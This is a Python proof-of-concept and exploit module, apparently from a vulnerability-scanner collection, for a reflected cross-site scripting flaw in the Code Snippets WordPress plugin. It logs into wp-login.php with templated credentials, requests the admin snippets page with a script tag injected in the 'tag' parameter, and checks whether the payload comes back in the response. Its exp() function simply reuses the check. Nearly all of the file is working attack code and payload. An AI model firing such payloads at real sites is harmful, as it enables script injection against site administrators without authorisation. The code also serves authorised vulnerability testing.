import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Code Snippets Wordpress Plugin - XSS''',
        "description": '''A reflected Cross-Site Scripting (XSS) vulnerability has been found in the Code Snippets WordPress Plugin. By using this vulnerability an attacker can inject malicious JavaScript code into the application, which will execute within the browser of any logged-in admin who views the link''',
        "severity": "medium",
        "references": [
            "https://www.securify.nl/en/advisory/cross-site-scripting-in-code-snippets-wordpress-plugin/"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "xss", "wp-plugin", "authenticated"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/wp-login.php"""
        method = "POST"
        data = """log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-admin/admin.php?page=snippets&tag=</script><script>alert(document.domain)</script>"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""</script><script>alert(document.domain)</script>""" in resp1.text) and ("""text/html""" in str(resp1.headers)) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url